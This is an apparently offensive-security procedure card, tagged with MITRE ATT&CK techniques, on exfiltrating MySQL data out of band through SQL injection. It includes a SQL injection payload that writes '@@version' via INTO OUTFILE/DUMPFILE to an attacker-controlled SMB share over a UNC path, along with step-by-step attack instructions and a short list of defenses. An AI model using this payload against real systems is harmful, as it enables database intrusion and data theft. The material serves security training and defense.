---
id: 5b7eaecc-91ba-4c5f-9e31-05ab8663c2fc
name: MySQL-Injection-Out-of-Band-Data-Exfiltration
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.009612+00:00'
updated_at: '2023-04-10T20:22:48.316407+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - '[[techniques/Web Service|T1102 - Web Service]]'
sub_techniques:
  - '[[sub-techniques/Dead Drop Resolver|T1102.001 - Dead Drop Resolver]]'
tags:
  - '[[tags/MYSQL Injection]]'
  - '[[tags/MYSQL Out of band]]'
commands: []
platforms:
  - Database
  - MySQL
tools: []
validated: true
---

# MySQL-Injection-Out-of-Band-Data-Exfiltration

## Summary

This procedure demonstrates how to exfiltrate data, such as the MySQL database version, from a vulnerable MySQL server using out-of-band (OOB) techniques via SQL injection. By leveraging the 'INTO OUTFILE' and 'INTO DUMPFILE' clauses in a SQL injection payload, data is written to a remote file share accessible via UNC path, allowing retrieval without direct database connections. This is particularly useful in environments where inbound traffic to the attacker is restricted, using covert channels like SMB for exfiltration.

## Description

In this procedure, an attacker exploits a MySQL injection vulnerability in a web application to execute arbitrary SQL commands. The payload uses system variables like @@version to retrieve database information and exports it to a remote file on an attacker-controlled server using UNC paths (e.g., \\attacker-ip\share\file.txt). This OOB method bypasses direct response-based exfiltration, which might be filtered or logged, by relying on network protocols like SMB for data transfer. The technique is effective against MySQL versions supporting file export (typically 5.x and later) and requires the MySQL process to have write permissions to the remote share. Once the file is created remotely, the attacker can access it directly from their system. This approach aids in reconnaissance for further exploitation, such as identifying vulnerable database versions, while evading detection through non-standard channels.

## Requirements

1. Valid SQL injection point in a web application connected to a MySQL backend.
2. Attacker-controlled remote file share (e.g., SMB share) accessible from the MySQL server via UNC path.
3. MySQL server configuration allowing file writes (secure_file_priv not restricting OUTFILE/DUMPFILE).
4. Network connectivity from the MySQL server to the attacker's share (SMB port 445 open outbound).

## Defense

- Sanitize and validate all user inputs to prevent SQL injection, using prepared statements and parameterized queries.
- Monitor network traffic for anomalous SMB connections from database servers to external IPs.
- Configure MySQL with secure_file_priv to limit or disable OUTFILE/DUMPFILE operations.
- Deploy web application firewalls (WAFs) to detect and block SQL injection payloads.
- Enable MySQL query logging and audit for suspicious SELECT INTO OUTFILE/DUMPFILE commands.

## Objectives

1. Exfiltrate sensitive database information (e.g., version details) to an attacker-controlled remote location.
2. Use OOB channels to avoid detection in restricted network environments.
3. Gather reconnaissance data to identify exploitable database configurations for subsequent attacks.

## Instructions

### Step 1: Identify SQL Injection Vulnerability

**Context**: Confirm the presence of a SQL injection vulnerability in the target web application. This step ensures you can inject and execute arbitrary SQL commands.

Use manual testing or automated tools like [[tools/sqlmap]] to verify injectability. For example, append a single quote (') to input fields and check for errors indicating unescaped SQL.

**Expected Output**: Database error messages revealing MySQL backend (e.g., "You have an error in your SQL syntax").

### Step 2: Craft and Inject Exfiltration Payload

**Context**: Construct a SQL payload to export data to a remote file using the vulnerable injection point. This leverages UNC paths for OOB exfiltration via SMB.

Inject the following SQL code snippet into the vulnerable parameter:

**Code** ([[codes/MySQL-Version-Exfiltration-to-Remote-File]]):

```sql
select @@version into outfile '\\192.168.0.100\temp\out.txt';
select @@version into dumpfile '\\192.168.0.100\temp\out.txt
```

Replace \\192.168.0.100\temp\out.txt with your attacker-controlled SMB share path. The first command uses OUTFILE to write the result set, while DUMPFILE writes without escaping, useful for binary data. Execute the injection via a tool like Burp Suite or curl.

If the injection succeeds, the MySQL server will attempt to write to the remote share.

**Expected Output**: No direct response from the database (OOB), but check your remote share for the created file containing the MySQL version (e.g., "8.0.30").

### Step 3: Verify Exfiltration

**Context**: Confirm the data has been successfully exfiltrated by accessing the remote file.

Navigate to your SMB share and open out.txt. If the file exists and contains the expected data, the exfiltration succeeded.

**Expected Output**: File out.txt populated with the MySQL version string.

**Success Indicators**:
- Remote file created without errors.
- File contents match expected database information.
